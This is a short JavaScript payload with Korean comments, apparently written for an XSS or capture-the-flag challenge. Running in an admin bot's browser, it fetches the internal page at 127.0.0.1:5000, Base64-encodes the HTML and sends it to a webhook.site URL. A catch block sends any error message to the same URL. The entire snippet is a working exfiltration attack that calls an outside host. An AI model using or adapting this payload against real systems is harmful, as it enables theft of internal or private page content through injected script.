(async () => {
    try {
        // 1. 봇의 입장에서 메인 페이지('/') 접속 시도
        // 봇은 로컬(127.0.0.1) 내부망에 있으므로 접속 가능
        const response = await fetch('http://127.0.0.1:5000/');
        
        // 2. 응답받은 HTML 텍스트 추출
        const text = await response.text();

        // 3. HTML 전체를 Base64로 인코딩 (내용이 길고 특수문자가 많으므로)
        const payload = btoa(text);

        // 4. 내 웹훅으로 전송
        await fetch(`https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3?html=${payload}`);
    } catch (e) {
        // 에러 나면 에러 메시지라도 전송
        await fetch(`https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3?error=${btoa(e.toString())}`);
    }
})();
